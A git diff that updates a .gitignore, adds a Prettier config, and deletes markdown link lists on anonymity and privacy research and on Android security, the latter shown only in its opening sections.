diff --git a/.gitignore b/.gitignore
old mode 100755
new mode 100644
index f956665..853b377
--- a/.gitignore
+++ b/.gitignore
@@ -1,38 +1,175 @@
-# Windows image file caches
-Thumbs.db
-ehthumbs.db
-
-# Folder config file
-Desktop.ini
-
-# Recycle Bin used on file shares
-$RECYCLE.BIN/
-
-# Windows Installer files
-*.cab
-*.msi
-*.msm
-*.msp
-
-# =========================
-# Operating System Files
-# =========================
-
-# OSX
-# =========================
-
+# Mine
+.idea
+node_modules/
+
+
+# Created by .ignore support plugin (hsz.mobi)
+### macOS template
+# General
 .DS_Store
 .AppleDouble
 .LSOverride
 
-# Icon must ends with two \r.
-Icon

+# Icon must end with two \r
+Icon
 
 # Thumbnails
 ._*
 
-# Files that might appear on external disk
+# Files that might appear in the root of a volume
+.DocumentRevisions-V100
+.fseventsd
 .Spotlight-V100
+.TemporaryItems
 .Trashes
-
-Draft/Draft/To Do/add cull -2.txt
\ No newline at end of file
+.VolumeIcon.icns
+.com.apple.timemachine.donotpresent
+
+# Directories potentially created on remote AFP share
+.AppleDB
+.AppleDesktop
+Network Trash Folder
+Temporary Items
+.apdisk
+### Windows template
+# Windows thumbnail cache files
+Thumbs.db
+ehthumbs.db
+ehthumbs_vista.db
+
+# Dump file
+*.stackdump
+
+# Folder config file
+[Dd]esktop.ini
+
+# Recycle Bin used on file shares
+$RECYCLE.BIN/
+
+# Windows Installer files
+*.cab
+*.msi
+*.msm
+*.msp
+
+# Windows shortcuts
+*.lnk
+### Linux template
+*~
+
+# temporary files which can be created if a process still has a handle open of a deleted file
+.fuse_hidden*
+
+# KDE directory preferences
+.directory
+
+# Linux trash folder which might appear on any partition or disk
+.Trash-*
+
+# .nfs files are created when an open file is removed but is still being accessed
+.nfs*
+### Python template
+# Byte-compiled / optimized / DLL files
+__pycache__/
+*.py[cod]
+*$py.class
+
+# C extensions
+*.so
+
+# Distribution / packaging
+.Python
+build/
+develop-eggs/
+dist/
+downloads/
+eggs/
+.eggs/
+lib/
+lib64/
+parts/
+sdist/
+var/
+wheels/
+*.egg-info/
+.installed.cfg
+*.egg
+MANIFEST
+
+# PyInstaller
+#  Usually these files are written by a python script from a template
+#  before PyInstaller builds the exe, so as to inject date/other infos into it.
+*.manifest
+*.spec
+
+# Installer logs
+pip-log.txt
+pip-delete-this-directory.txt
+
+# Unit test / coverage reports
+htmlcov/
+.tox/
+.coverage
+.coverage.*
+.cache
+nosetests.xml
+coverage.xml
+*.cover
+.hypothesis/
+
+# Translations
+*.mo
+*.pot
+
+# Django stuff:
+*.log
+.static_storage/
+.media/
+local_settings.py
+
+# Flask stuff:
+instance/
+.webassets-cache
+
+# Scrapy stuff:
+.scrapy
+
+# Sphinx documentation
+docs/_build/
+
+# PyBuilder
+target/
+
+# Jupyter Notebook
+.ipynb_checkpoints
+
+# pyenv
+.python-version
+
+# celery beat schedule file
+celerybeat-schedule
+
+# SageMath parsed files
+*.sage.py
+
+# Environments
+.env
+.venv
+env/
+venv/
+ENV/
+env.bak/
+venv.bak/
+
+# Spyder project settings
+.spyderproject
+.spyproject
+
+# Rope project settings
+.ropeproject
+
+# mkdocs documentation
+/site
+
+# mypy
+.mypy_cache/
diff --git a/.prettierrc b/.prettierrc
new file mode 100644
index 0000000..34341e3
--- /dev/null
+++ b/.prettierrc
@@ -0,0 +1,6 @@
+{
+    "printWidth": 80,
+    "tab-width": 4,
+    "use-tabs": false,
+    "parser": "markdown",
+}
\ No newline at end of file
diff --git a/Draft/AnonOpsecPrivacy.md b/Draft/AnonOpsecPrivacy.md
deleted file mode 100755
index 0ce6ad9..0000000
--- a/Draft/AnonOpsecPrivacy.md
+++ /dev/null
@@ -1,223 +0,0 @@
-## Anonymity, Opsec & Privacy
-
-### TOC
-
-* Cull
-* [General](#general)
-* [Blogposts](#blog)
-* [Articles](#Articles)
-* [How-Tos](#howtos)
-* [Papers](#Papers)
-* [Talks/Videos](#talks)
-* [Tools](#Tools)
-* [Miscellaneous](#misc)
-
-
-
-
-
-
-
-#### Cull
-[Technical analysis of client identification mechanisms](http://www.chromium.org/Home/chromium-security/client-identification-mechanisms) 
-[Client Identification Mechanisms](http://www.chromium.org/Home/chromium-security/client-identification-mechanisms)
-#### end cull
-
-
---------------
-### <a name="general"></a>General
-* [OS X Security and Privacy Guide](https://github.com/drduh/OS-X-Security-and-Privacy-Guide)
-* [Bugger - Adam Curtis](http://www.bbc.co.uk/blogs/adamcurtis/entries/3662a707-0af9-3149-963f-47bea720b460)
-	* Maybe the real state secret is that spies aren't very good at their jobs and don't know much about the world
-* [Mobile Phone Data lookup](https://medium.com/@philipn/want-to-see-something-crazy-open-this-link-on-your-phone-with-wifi-turned-off-9e0adb00d024)
-
-
-
-
-
-
-
-
-
-
-
-
-
---------------
-### <a name="blog"></a>Blogposts
-Blogposts
-* [De-Anonymizing Alt.Anonymous.Messages](https://ritter.vg/blog-deanonymizing_amm.html)
-* [Defeating and Detecting Browser Spoofing - Browserprint](https://browserprint.info/blog/defeatingSpoofing)
-* [Invasion of Privacy - HackerFactor](http://www.hackerfactor.com/blog/index.php?/archives/703-Invasion-of-Privacy.html)
-* [Trawling Tor Hidden Service – Mapping the DHT](https://donncha.is/2013/05/trawling-tor-hidden-services/)
-* [China travel laptop setup](https://mricon.com/i/travel-laptop-setup.html?t=1&cn=ZmxleGlibGVfcmVjcw%3D%3D&iid=88d246896d384d5292f51df954a2c8ba&uid=150127534&nid=244+272699400)
-* [Operational Security and the Real World - The Grugq](https://medium.com/@thegrugq/operational-security-and-the-real-world-3c07e7eeb2e8)
-* [CIA Vault7 Development Tradecraft DOs and DON'Ts](https://wikileaks.org/ciav7p1/cms/page_14587109.html)
-* [Dutch-Russian cyber crime case reveals how police tap the internet - ElectroSpaces](http://electrospaces.blogspot.de/2017/06/dutch-russian-cyber-crime-case-reveals.html?m=1)
-* [Deanonymizing Windows users and capturing Microsoft and VPN accounts](https://medium.com/@ValdikSS/deanonymizing-windows-users-and-capturing-microsoft-and-vpn-accounts-f7e53fe73834)
-* [The Paranoid's Bible: An anti-dox effort.](https://paranoidsbible.tumblr.com/)
-* [Debian-Privacy-Server-Guide](https://github.com/drduh/Debian-Privacy-Server-Guide)
-	* This is a step-by-step guide to configuring and managing a domain, remote server and hosted services, such as VPN, a private and obfuscated Tor bridge, and encrypted chat, using the Debian GNU/Linux operating system and other free software.
-* [Reminder: Oh, Won't You Please Shut Up? - USA](https://www.popehat.com/2011/12/01/reminder-oh-wont-you-please-shut-up/)
-
-
-
-
-
-
-
---------------
-### <a name="Articles">Articles</a>
-* [De-anonymizing facebook users through CSP](http://www.myseosolution.de/deanonymizing-facebook-users-by-csp-bruteforcing/#inhaltsverzeichnis)
-* [Anonymous’s Guide to OpSec](http://www.covert.io/research-papers/security/Anonymous%20Hacking%20Group%20--%20OpNewblood-Super-Secret-Security-Handbook.pdf)
-* [Cat Videos and the Death of Clear Text](https://citizenlab.org/2014/08/cat-video-and-the-death-of-clear-text/)
-* [How to Spot a SpoCTok](https://cryptome.org/dirty-work/spot-spook.htm)
-* [China travel laptop setup](https://mricon.com/i/travel-laptop-setup.html?t=1&cn=ZmxleGlibGVfcmVjcw%3D%3D&iid=88d246896d384d5292f51df954a2c8ba&uid=150127534&nid=244+272699400)
-* [Operational Security and the Real World - The Grugq](https://medium.com/@thegrugq/operational-security-and-the-real-world-3c07e7eeb2e8)
-* [Protecting Your Sources When Releasing Sensitive Documents](https://source.opennews.org/articles/how-protect-your-sources-when-releasing-sensitive-/)
-* [Bugger - Adam Curtis](http://www.bbc.co.uk/blogs/adamcurtis/entries/3662a707-0af9-3149-963f-47bea720b460)
-	* Maybe the real state secret is that spies aren't very good at their jobs and don't know much about the world
-* [Detect Tor Exit doing sniffing by passively detecting unique DNS query (via HTML & PCAP parsing/viewing)](https://github.com/NullHypothesis/exitmap/issues/37)
-* [Managing Pseudonyms with Compartmentalization: Identity Management of Personas](https://www.alienvault.com/blogs/security-essentials/managing-pseudonyms-with-compartmentalization-identity-management-of-personas)
-* [Data release: list of websites that have third-party “session replay” scripts ](https://webtransparency.cs.princeton.edu/no_boundaries/session_replay_sites.html)
-* [No boundaries: Exfiltration of personal data by session-replay scripts](https://freedom-to-tinker.com/2017/11/15/no-boundaries-exfiltration-of-personal-data-by-session-replay-scripts/)
-
-
---------------
-### <a name="howtos"How-Tos</a>
-* [How to stop Firefox from making automatic connections](https://support.mozilla.org/en-US/kb/how-stop-firefox-making-automatic-connections)
-
-
-
-
-
-
-
-
-
-
---------------
-### <a name="Papers">Papers</a>
-* [Protocol Misidentification Made Easy with Format-Transforming Encryption](https://eprint.iacr.org/2012/494.pdf)
-	* Deep packet inspection DPI technologies provide much- needed visibility and control of network traffic using port- independent protocol identification, where a network ow is labeled with its application-layer protocol based on packet contents. In this paper, we provide the most comprehensive evaluation of a large set of DPI systems from the point of view of protocol misidentification attacks, in which adver- saries on the network attempt to force the DPI to mislabel connections. Our approach uses a new cryptographic primitive called format-transforming encryption FTE, which extends conventional symmetric encryption with the ability to transform the ciphertext into a format of our choosing. We design an FTE-based record layer that can encrypt arbi- trary application-layer traffic, and we experimentally show that this forces misidentification for all of the evaluated DPI systems. This set includes a proprietary, enterprise-class DPI system used by large corporations and nation-states. We also show that using FTE as a proxy system incurs no latency overhead and as little as 16% bandwidth overhead compared to standard SSH tunnels. Finally, we integrate our FTE proxy into the Tor anonymity network and demonstrate that it evades real-world censorship by the Great Firewall of China. 
-* ['I've Got Nothing to Hide' and Other Misunderstandings of Privacy](http://papers.ssrn.com/sol3/papers.cfm?abstract_id=998565&)
-	* We live in a surveillance state. Law enforcement and intelligence agencies have access to a huge amount of data about us, enabling them to learn intimate, private details about our lives. In part, the ease with which they can obtain such information reflects the fact that our laws have failed to keep up with advances in technology. However, privacy enhancing technologies can offer real protections even when the law does not. That intelligence agencies like the NSA are able to collect records about every telephone call made in the United States, or engage in the bulk surveillance of Internet communications is only possible because so much of our data is transmitted in the clear. The privacy enhancing technologies required to make bulk surveillance impossible and targeted surveillance more difficult already exist. We just need to start using them.
-* [Masquerade: How a Helpful Man-in-the-Middle Can Help You Evade Monitoring** - Defcon22](https://www.youtube.com/watch?v=_KyfJW2lHtk&spfreload=1)
-	* Sometimes, hiding the existence of a communication is as important as hiding the contents of that communication. While simple network tunneling such as Tor or a VPN can keep the contents of communications confidential, under active network monitoring or a restrictive IDS such tunnels are red flags which can subject the user to extreme scrutiny. Format-Transforming Encryption FTE can be used to tunnel traffic within otherwise innocuous protocols, keeping both the contents and existence of the sensitive traffic hidden.  However, more advanced automated intrusion detection, or moderately sophisticated manual inspection, raise other red flags when a host reporting to be a laser printer starts browsing the web or opening IM sessions, or when a machine which appears to be a Mac laptop sends network traffic using Windows-specific network settings.  We present Masquerade: a system which combines FTE and host OS profile selection to allow the user to emulate a user-selected operating system and application-set in network traffic and settings, evading both automated detection and frustrating after-the-fact analysis.
-	* [Slides](https://www.portalmasq.com/portal-defcon.pdf)
-* [The NSA: Capabilities and Countermeasures** - Bruce Schneier - ShmooCon 2014](https://www.youtube.com/watch?v=D5JA8Ytk9EI)
-	* Edward Snowden has given us an unprecedented window into the NSA's surveillance activities. Drawing from both the Snowden documents and revelations from previous whistleblowers, I will describe the sorts of surveillance the NSA does and how it does it. The emphasis is on the technical capabilities of the NSA, not the politics of their actions. This includes how it conducts Internet surveillance on the backbone, but is primarily focused on their offensive capabilities: packet injection attacks from the Internet backbone, exploits against endpoint computers and implants to exfiltrate information, fingerprinting computers through cookies and other means, and so on. I will then talk about what sorts of countermeasures are likely to frustrate the NSA. Basically, these are techniques to raise the cost of wholesale surveillance in favor of targeted surveillance: encryption, target hardening, dispersal, and so on.
-* [You're Leaking Trade Secrets - Defcon22 Michael Schrenk](https://www.youtube.com/watch?v=JTd5TL6_zgY)
-	* Networks don't need to be hacked for information to be compromised. This is particularly true for organizations that are trying to keep trade secrets. While we hear a lot about personal privacy, little is said in regard to organizational privacy. Organizations, in fact, leak information at a much greater rate than individuals, and usually do so with little fanfare. There are greater consequences for organizations when information is leaked because the secrets often fall into the hands of competitors. This talk uses a variety of real world examples to show how trade secrets are leaked online, and how organizational privacy is compromised by seemingly innocent use of The Internet.
-* [Deep-Spying: Spying using Smartwatch and Deep Learning - Tony Beltramelli](https://arxiv.org/pdf/1512.05616v1.pdf)
-* [HORNET: High-speed Onion Routing at the Network Layer](http://arxiv.org/pdf/1507.05724v1.pdf)
-* [Decoy Routing: Toward Unblockable Internet Communication](https://www.usenix.org/legacy/events/foci11/tech/final_files/Karlin.pdf)
-	* We present decoy routing, a mechanism capable of cir- cumventing common network filtering strategies. Unlike other circumvention techniques, decoy routing does not require a client to connect to a specific IP address (which is easily blocked) in order to provide circumvention. We show that if it is possible for a client to connect to any unblocked host/service, then decoy routing could be used to connect them to a blocked destination without coop- eration from the host. This is accomplished by placing the circumvention service in the network itself – where a single device could proxy traffic between a significant fraction of hosts – instead of at the edge.
-* [obfs4 (The obfourscator)](https://gitweb.torproject.org/pluggable-transports/obfs4.git/tree/doc/obfs4-spec.txt)
-	* This is a protocol obfuscation layer for TCP protocols. Its purpose is to keep a third party from telling what protocol is in use based on message contents. Unlike obfs3, obfs4 attempts to provide authentication and data integrity, though it is still designed primarily around providing a layer of obfuscation for an existing authenticated protocol like SSH or TLS.
-* [obfs3 (The Threebfuscator)](https://gitweb.torproject.org/pluggable-transports/obfsproxy.git/tree/doc/obfs3/obfs3-protocol-spec.txt)
-	* This is a protocol obfuscation layer for TCP protocols. Its purpose is to keep a third party from telling what protocol is in use based on message contents. Like obfs2, it does not provide authentication or data integrity. It does not hide data lengths. It is more suitable for providing a layer of obfuscation for an existing authenticated protocol, like SSH or TLS. 
-* [StegoTorus: A Camouflage Proxy for the Tor Anonymity System](https://research.owlfolio.org/pubs/2012-stegotorus.pdf)
-	* Internet censorship by governments is an increasingly common practice worldwide. Internet users and censors are locked in an arms race: as users find ways to evade censorship schemes, the censors develop countermeasures for the evasion tactics. One of the most popular and effective circumvention tools, Tor, must regularly adjust its network traffic signature to remain usable. We present StegoTorus, a tool that comprehensively disguises Tor from protocol analysis. To foil analysis of packet contents, Tor’s traffic is steganographed to resemble an innocuous cover protocol, such as HTTP. To foil analysis at the transport level, the Tor circuit is distributed over many shorter-lived connections with per-packet characteristics that mimic cover-protocol traffic. Our evaluation demonstrates that StegoTorus improves the resilience of Tor to fingerprinting attacks and delivers usable performance.
-* [SkypeMorph: Protocol Obfuscation for Tor Bridges](https://www.cypherpunks.ca/~iang/pubs/skypemorph-ccs.pdf)
-	* The Tor network is designed to provide users with low- latency anonymous communications. Tor clients build circuits with publicly listed relays to anonymously reach their destinations. However, since the relays are publicly listed, they can be easily blocked by censoring adversaries. Consequently, the Tor project envisioned the possibility of unlisted entry points to the Tor network, commonly known as bridges. We address the issue of preventing censors from detecting the bridges by observing the communications between them and nodes in their network. We propose a model in which the client obfuscates its messages to the bridge in a widely used protocol over the Inter- net. We investigate using Skype video calls as our target protocol and our goal is to make it difficult for the censor- ing adversary to distinguish between the obfuscated bridge connections and actual Skype calls using statistical compar- isons. We have implemented our model as a proof-of-concept pluggable transport for Tor, which is available under an open-source licence. Using this implementation we observed the obfuscated bridge communications and compared it with those of Skype calls and presented the results.
-* [Protocol Misidentification Made Easy with Format-Transforming Encryption](https://kpdyer.com/publications/ccs2013-fte.pdf)
-	* Deep packet inspection (DPI) technologies provide much needed visibility and control of network traffic using port- independent protocol identification, where a network flow is labeled with its application-layer protocol based on packet contents. In this paper, we provide the first comprehensive evaluation of a large set of DPI systems from the point of view of protocol misidentification attacks, in which adver- saries on the network attempt to force the DPI to mislabel connections. Our approach uses a new cryptographic prim- itive called format-transforming encryption (FTE), which extends conventional symmetric encryption with the ability to transform the ciphertext into a format of our choosing. We design an FTE-based record layer that can encrypt arbitrary application-layer traffic, and we experimentally show that this forces misidentification for all of the evaluated DPI systems. This set includes a proprietary, enterprise-class DPI system used by large corporations and nation-states. We also show that using FTE as a proxy system incurs no latency overhead and as little as 16% bandwidth overhead compared to standard SSH tunnels. Finally, we integrate our FTE proxy into the Tor anonymity network and demon- strate that it evades real-world censorship by the Great Fire- wall of China
-* [Cirripede: Circumvention Infrastructure using Router Redirection with Plausible Deniability](http://hatswitch.org/~nikita/papers/cirripede-ccs11.pdf)
-	* Many users face surveillance of their Internet communications and a significant fraction suffer from outright blocking of certain destinations. Anonymous communication systems allow users to conceal the destinations they communicate with, but do not hide the fact that the users are using them. The mere use of such systems may invite suspicion, or access to them may be blocked. We therefore propose Cirripede, a system that can be used for unobservable communication with Internet destinations. Cirripede is designed to be deployed by ISPs; it intercepts connections from clients to innocent-looking desti- nations and redirects them to the true destination requested by the client. The communication is encoded in a way that is indistinguishable from normal communications to anyone without the master secret key, while public-key cryptogra- phy is used to eliminate the need for any secret information that must be shared with Cirripede users. Cirripede is designed to work scalably with routers that handle large volumes of traffic while imposing minimal over- head on ISPs and not disrupting existing traffic. This allows Cirripede proxies to be strategically deployed at central lo- cations, making access to Cirripede very difficult to block. We built a proof-of-concept implementation of Cirripede and performed a testbed evaluation of its performance proper- ties
-* [TapDance: End-to-Middle Anticensorship without Flow Blocking](https://jhalderm.com/pub/papers/tapdance-sec14.pdf)
-	* In response to increasingly sophisticated state-sponsored Internet censorship, recent work has proposed a new ap- proach to censorship resistance: end-to-middle proxying. This concept, developed in systems such as Telex, Decoy Routing, and Cirripede, moves anticensorship technology into the core of the network, at large ISPs outside the censoring country. In this paper, we focus on two technical obstacles to the deployment of certain end-to-middle schemes: the need to selectively block flows and the need to observe both directions of a connection. We propose a new construction, TapDance, that removes these require- ments. TapDance employs a novel TCP-level technique that allows the anticensorship station at an ISP to function as a passive network tap, without an inline blocking com- ponent. We also apply a novel steganographic encoding to embed control messages in TLS ciphertext, allowing us to operate on HTTPS connections even under asymmetric routing. We implement and evaluate a TapDance proto- type that demonstrates how the system could function with minimal impact on an ISP’s network operations.
-* [Chipping Away at Censorship Firewalls with User-Generated Content](https://www.usenix.org/legacy/event/sec10/tech/full_papers/Burnett.pdf)
-	* Oppressive regimes and even democratic governments restrict Internet access. Existing anti-censorship systems often require users to connect through proxies, but these systems are relatively easy for a censor to discover and block. This paper offers a possible next step in the cen- sorship arms race: rather than relying on a single system or set of proxies to circumvent censorship firewalls, we explore whether the vast deployment of sites that host user-generated content can breach these firewalls. To explore this possibility, we have developed Collage, which allows users to exchange messages through hidden chan- nels in sites that host user-generated content. Collage has two components: a message vector layer for embedding content in cover traffic; and a rendezvous mechanism to allow parties to publish and retrieve messages in the cover traffic. Collage uses user-generated content (e.g. , photo-sharing sites) as “drop sites” for hidden messages. To send a message, a user embeds it into cover traffic and posts the content on some site, where receivers retrieve this content using a sequence of tasks. Collage makes it difficult for a censor to monitor or block these messages by exploiting the sheer number of sites where users can exchange messages and the variety of ways that a mes- sage can be hidden. Our evaluation of Collage shows that the performance overhead is acceptable for sending small messages (e.g. , Web articles, email). We show how Collage can be used to build two applications: a direct messaging application, and a Web content delivery sys- tem
-* [Unblocking the Internet: Social networks foil censors](http://kscope.news.cs.nyu.edu/pub/TR-2008-918.pdf)
-	* Many countries and administrative domains exploit control over their communication infrastructure to censor online content. This paper presents the design, im plementation and evaluation of Kaleidoscope , a peer-to-peer system of relays that enables users within a censored domain to access blocked content. The main challenge facing Kaleidoscope is to resist the cens or’s efforts to block the circumvention system itself. Kaleidoscope achieves blocking-resilienc e using restricted service discovery that allows each user to discover a small set of unblocked relays while only exposing a small fraction of relays to the censor. To restrict service discovery, Kaleidoscope leverages a trust network where links reflects real-world social relationships among users and uses a limited advertisement protocol based on random routes to disseminate relay addresses along the trust netwo rk; the number of nodes reached by a relay advertisement should ideally be inversely proportional to the maximum fraction of infiltration and is independent of the network size. To increase service availa bility in large networks with few exit relay nodes, Kaleidoscope forwards the actual data traffic across multiple relay hops without risking exposure of exit relays. Using detailed analysis and simulations, we show that Kalei doscope provides > 90% service availability even under substantial infiltration (close to 0.5% of edges) and when only 30% of the relay nodes are online. We have implemented and deployed our system on a small scale serving over 100,000 requests to 40 censored users (relatively small user base to realize Kaleidoscope’s anti-blocking guarantees) spread across different countries and administrative domains over a 6-month period
-* [A Technical Description of Psiphon](https://psiphon.ca/en/blog/psiphon-a-technical-description)
-* * [Discovering Browser Extensions via Web Accessible Resources - Chalmers security lab](http://www.cse.chalmers.se/research/group/security/publications/2017/extensions/codaspy-17-full.pdf)
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
---------------
-### <a name="Talks">Talks & Videos(& Presentations)</a>
-* [Cookieless Monster: Exploring the Ecosystem of Web-based Device Fingerprinting](http://securitee.org/files/cookieless_sp2013.pdf)
-* [Because Jail is for WUFTPD - Legendary talk, a must watch.](https://www.youtube.com/watch?v=9XaYdCdwiWU)
-* [The Gruqgs blog](http://grugq.tumblr.com/)
-* [COMSEC: Beyond encryption](https://grugq.github.io/presentations/COMSEC%20beyond%20encryption.pdf)
-* [DEFCON 20: Can You Track Me Now? Government And Corporate Surveillance Of Mobile Geo-Location Data](https://www.youtube.com/watch?v=NjuhdKUH6U4)
-* [Detecting and Defending Against a Surveillance State - DEFCON 22 - Robert Rowley](https://www.youtube.com/watch?v=d5jqV06Yijw)
-* [Detecting and Defending Against a Surveillance State - Robert Rowley - DEF CON 22](https://www.youtube.com/watch?v=d5jqV06Yijw)
-* [The NSA: Capabilities and Countermeasures - ShmooCon 2014](https://www.youtube.com/watch?v=D5JA8Ytk9EI)
-* [Blinding The Surveillance State - Christopher Soghoian - DEF CON 22](https://www.youtube.com/watch?v=pM8e0Dbzopk)
-* [Client Identification Mechanisms](http://www.chromium.org/Home/chromium-security/client-identification-mechanisms)
-* [Can you track me now? - Defcon20](https://wEww.youtube.com/watch?v=DxIF66Tcino)
-* [Phones and Privacy for Consumers - Matt Hoy (mattrix) and David Khudaverdyan (deltaflyer)](http://www.irongeek.com/i.php?page=videos/grrcon2015/submerssion-therapy05-phones-and-privacy-for-consumers-matt-hoy-mattrix-and-david-khudaverdyan-deltaflyerhttps://ritter.vg/blog-deanonymizing_amm.html)
-* [Retail Surveillance / Retail Countersurveillance 50 most unwanted retail surveillance technologies / 50 most wanted countersurveillance technologies](https://media.ccc.de/v/33c3-8238-retail_surveillance_retail_countersurveillance#video&t=1993)
-* [OPSEC Concerns in Using Crypto](https://www.slideshare.net/JohnCABambenek/defcon-crypto-village-opsec-concerns-in-using-crypto)
-* [De-Anonymizing Alt.Anonymous. Messages - Defcon21 - Tom Ritter](https://www.youtube.com/watch?v=_Tj6c2Ikq_E)
-* [PISSED: Privacy In a Surveillance State Evading Detection - Joe Cicero - CYPHERCON11 ](https://www.youtube.com/watch?v=keA3WcKwZwA)
-* [What Happens Next Will Amaze You](http://idlewords.com/talks/what_happens_next_will_amaze_you.htm#six_fixes)
-* [Wifi Tracking: Collecting the (probe) Breadcrumbs - David Switzer](https://www.youtube.com/watch?v=HzQHWUM8cNo)
-	* Wifi probes have provided giggles via Karma and Wifi Pineapples for years, but is there more fun to be had? Like going from sitting next to someone on a bus, to knowing where they live and hang out? Why try to MITM someone’s wireless device in an enterprise environment where they may notice — when getting them at their favorite burger joint is much easier. In this talk we will review ways of collecting and analyzing probes. We’ll use the resulting data to figure out where people live, their daily habits, and discuss uses (some nice, some not so nice) for this information. We’ll also dicuss how to make yourself a little less easy to track using these methods. Stingrays are price prohibitive, but for just tracking people’s movements.. this is cheap and easy.
-* [How Tor Users Got Caught - Defcon 22](https://www.youtube.com/watch?v=7G1LjQSYM5Q)
-	* [Part 2](https://www.youtube.com/watch?v=TQ2bk9kMneI)
-* [Article -  How Tor Users Got Caught by Government Agencies](http://se.azinstall.net/2015/11/how-tor-users-got-caught.html)
-* [You Are Being Tracked: How License Plate Readers Are Being Used to Record Americans' Movements - ACLU](https://www.aclu.org/other/you-are-being-tracked-how-license-plate-readers-are-being-used-record-americans-movements?redirect=technology-and-liberty/you-are-being-tracked-how-license-plate-readers-are-being-used-record)
-* [Deep Dive Into Tor Onion Services - David Goulet](https://www.youtube.com/watch?v=AkoyCLAXVsc)
-* [Winning and Quitting the Privacy Game What it REALLY takes to have True Privacy in the 21st Century - Derbycon 7](https://www.youtube.com/watch?v=bxQSu06yuZc)
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
---------------
-### <a name="Tools">Tools</a>
-* [FakeNameGenerator](http://www.fakenamegenerator.com/)
-* [MAT: Metadata Anonymisation Toolkit](https://mat.boum.org/) 
-	* MAT is a toolbox composed of a GUI application, a CLI application and a library.
-* [fteproxy](https://fteproxy.org/about)
-	* fteproxy is fast, free, open source, and cross platform. It has been shown to circumvent network monitoring software such as bro, YAF, nProbe, l7-filter, and appid, as well as closed-source commercial DPI systems
-* [Streisand](https://github.com/jlund/streisand)
-	* Streisand sets up a new server running L2TP/IPsec, OpenSSH, OpenVPN, Shadowsocks, sslh, Stunnel, and a Tor bridge. It also generates custom configuration instructions for all of these services. At the end of the run you are given an HTML file with instructions that can be shared with friends, family members, and fellow activists.
-* [exitmap](https://github.com/NullHypothesis/exitmap)
-	* Exitmap is a fast and modular Python-based scanner for Tor exit relays. Exitmap modules implement tasks that are run over (a subset of) all exit relays. If you have a background in functional programming, think of exitmap as a map() interface for Tor exit relays. Modules can perform any TCP-based networking task; fetching a web page, uploading a file, connecting to an SSH server, or joining an IRC channel.
-* [OnionCat - an Anonymous VPN adapter](https://www.onioncat.org/about-onioncat/)
-* [howmanypeoplearearound](https://github.com/schollz/howmanypeoplearearound)
-	*  Count the number of people around you ???????? by monitoring wifi signals ??
-* [Decentraleyes](https://addons.mozilla.org/en-US/firefox/addon/decentraleyes/)
-	* Protects you against tracking through "free", centralized, content delivery. It prevents a lot of requests from reaching networks like Google Hosted Libraries, and serves local files to keep sites from breaking. Complements regular content blockers.
-* [Decentraleyes - Github](https://github.com/Synzvato/decentraleyes)
-	* A web browser extension that emulates Content Delivery Networks to improve your online privacy. It intercepts traffic, finds supported resources locally, and injects them into the environment. All of this happens automatically, so no prior configuration is required.
-* [Destroy-Windows-10-Spying](https://github.com/Nummer/Destroy-Windows-10-Spying)
-	* Destroy Windows Spying tool
-* [meek](https://github.com/Yawning/meek)
-	* meek is a blocking-resistant pluggable transport for Tor. It encodes a data stream as a sequence of HTTPS requests and responses. Requests are reflected through a hard-to-block third-party web server in order to avoid talking directly to a Tor bridge. HTTPS encryption hides fingerprintable byte patterns in Tor traffic.sek
-* [HTTPLeaks](https://github.com/cure53/HTTPLeaks)
-	* HTTPLeaks - All possible ways, a website can leak HTTP requests
-
-
-
---------------
-### <a name="misc"></a>Misc
-* [.NET Github: .NET core should not SPY on users by default #3093](https://github.com/dotnet/cli/issues/3093)
-* [.NET Github: Revisit Telemetry configuration #6086 ](https://github.com/dotnet/cli/issues/6086)
\ No newline at end of file
diff --git a/Draft/Attacking Defending Android -.md b/Draft/Attacking Defending Android -.md
deleted file mode 100755
index 4a1dddc..0000000
--- a/Draft/Attacking Defending Android -.md	
+++ /dev/null
@@ -1,389 +0,0 @@
-## Attacking Android Devices
-
-
-
-
-### TOC
-Cull
-* [Intro](#Intro)
-* [Android Internals](#AInternals)
-* [Securing Android](#SecAnd)
-* [Android Apps](#Apps)
-* [Vulnerabilities](#Vulns)
-* [Exploits](#Exploits)
-* [Device Analysis](#DAnalysis)
-* [Application Analysis](#AppAnalysis)
-	* Dynamic Analysis
-	* Static Analysis
-	* Online APK Analyzers
-* [Online APK Analyzers](#OnlineAPK)
-* [Attack Platforms](#APlatforms)
-* [Android Malware](#Malware)
-* [Reverse Engineering Android](#RE)
-* [Interesting Papers](#Papers)
-* [Write-ups](#Write)
-* [Educational Materials](#Education)
-* [Books](#Books)
-* [Other](#Other)
-
-
-
-
-
-#### Cull/Sort
-* Redo formatting
-
-https://blog.gdssecurity.com/labs/2015/2/18/when-efbfbd-and-friends-come-knocking-observations-of-byte-a.html
-
-[Intercepting HTTPS traffic of Android Nougat Applications](https://serializethoughts.com/2016/09/10/905/)
-* TL;DR To intercept network traffic for Android 7.0 targeted applications, introduce a res/xml/network_security_config.xml file.
-
-http://nelenkov.blogspot.com
-
-[Add Security Exception to APK](https://github.com/levyitay/AddSecurityExceptionAndroid)
-
-[DonkeyGuard](https://github.com/CollegeDev/DonkeyGuard/)
-* DonkeyGuard allows you a fine-grained tuning of access to your private data. It currently supports 41 restrictions which can be applied for every application. Specifically, it is a Privacy service provider which implements a set of modifications to the Android Framework to allow you to interact with applications which are trying to access your private data. 
-
-[The Android boot process](https://thecyberfibre.com/android-boot-process/)
-
-
-
-[Miroslav Stampar - Android: Practical Introduction into the (In)Security](https://www.youtube.com/watch?v=q1_rvrY4VHI)
-* This presentation covers the user’s deadly sins of Android (In)Security, together with implied system security problems. Each topic could potentially introduce unrecoverable damage from security perspective. Both local and remote attacks are covered, along with accompanying practical demo of most interesting ones. 
-
-#### End cull
- 
-
-### General
-
-[Droidsec - Pretty much should be your first stop](http://www.droidsec.org/wiki/)
-
-[Hacking Your Way Up The Mobile Stack](http://vimeo.com/51270090)
-| **csploit** - "The most complete and advanced IT security professional toolkit on Android."(*From their site*) | http://www.csploit.org/docs.html -- [Github Link](https://github.com/cSploit/android/tree/master/cSploit)
-
-[Mobile Application Penetration Testing Cheat Sheet](https://github.com/tanprathan/MobileApp-Pentest-Cheatsheet)
-
-
-
-### **<a name="AInternals">Android Internals</a>**
-| Title     | Link |
-| -------- | ------------------------ |
-| **Dalvik opcodes** | http://pallergabor.uw.hu/androidblog/dalvik_opcodes.html
-| **Dalvik Bytecode Format docs** | http://source.android.com/devices/tech/dalvik/dex-format.html
-| **The Android boot process from power on** | http://www.androidenea.com/2009/06/android-boot-process-from-power-on.html
